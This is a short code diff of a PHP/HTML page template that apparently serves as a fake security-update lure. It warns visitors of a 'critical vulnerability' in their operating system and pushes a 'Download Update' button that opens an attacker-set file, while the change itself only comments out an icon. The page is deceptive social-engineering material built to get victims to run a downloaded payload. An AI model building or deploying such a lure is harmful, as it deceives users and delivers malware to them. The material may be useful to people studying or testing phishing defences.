@@ -103,7 +103,7 @@ button.positive, .buttons a.positive{
  <h2>There has been a <u>critical vulnerability</u> discovered in <?php echo $OS;?></h2>
  <b>It is essential that you patch your system before continuing.<br /><br />
  Sorry for any inconvenience caused.</b>
-<div class="buttons"><p align="center"><a class="positive" name="save" href="#" onclick="window.open('<?php echo $file;?>','download'); return false;"><img src="tick.png" alt=""/>Download Update</a></p></div>
+<div class="buttons"><p align="center"><a class="positive" name="save" href="#" onclick="window.open('<?php echo $file;?>','download'); return false;"><?php #<img src="tick.png" alt=""/>?> Download Update</a></p></div>
 <br />
 <h3>How to update: </h3>
 1.) Click on the link above to begin the download process.<br />
